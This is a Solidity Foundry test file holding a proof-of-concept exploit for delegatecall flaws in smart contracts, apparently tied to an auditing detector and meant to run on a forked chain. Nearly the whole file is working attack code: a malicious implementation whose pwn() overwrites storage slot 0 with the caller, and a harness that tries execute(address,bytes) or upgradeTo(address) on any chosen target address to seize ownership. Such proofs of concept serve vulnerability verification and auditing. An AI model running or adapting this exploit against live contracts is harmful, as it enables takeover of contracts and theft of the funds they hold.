// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Delegatecall to attacker-controlled logic
/// @notice Detector: delegatecall / bytecode-delegatecall. The target
///         delegatecalls to an implementation the caller chooses (or can
///         upgrade). Delegatecall runs the attacker's code IN THE TARGET'S
///         STORAGE, so an SSTORE to slot 0 overwrites the target's owner.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the entry point -- the target
///      may expose it as execute(address,bytes), upgradeTo(address),
///      setImplementation(address), or delegate(address,bytes).

contract MaliciousImpl {
    // Runs via delegatecall: sstore writes to the TARGET's storage.
    // caller() is preserved msg.sender (the attacker), so slot 0 becomes
    // the attacker -- slot 0 is `owner` in most contracts (verify!).
    function pwn() external {
        assembly {
            sstore(0, caller())
        }
    }

    function owner() external view returns (address) {
        address o;
        assembly {
            o := sload(0)
        }
        return o;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readOwner() internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        MaliciousImpl malicious = new MaliciousImpl();

        // Attempt 1: target lets the caller pick the delegatecall target.
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature(
                "execute(address,bytes)",
                address(malicious),
                abi.encodeWithSignature("pwn()")
            )
        );
        if (!ok) {
            // Attempt 2: upgrade-then-call shape.
            vm.prank(attackerEOA);
            (bool upOk,) = target.call(
                abi.encodeWithSignature("upgradeTo(address)", address(malicious))
            );
            require(upOk, "neither execute(address,bytes) nor upgradeTo(address) worked -- adapt the entry point");
            vm.prank(attackerEOA);
            (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
            require(pwnOk, "pwn() call on upgraded target failed");
        }

        (bool found, address owner_) = _readOwner();
        require(found, "target has no owner() view -- check slot 0 via vm.load instead");
        console.log("owner after delegatecall:", owner_);
        assertEq(owner_, attackerEOA, "exploit did not reproduce: slot 0 is not the attacker");
    }
}
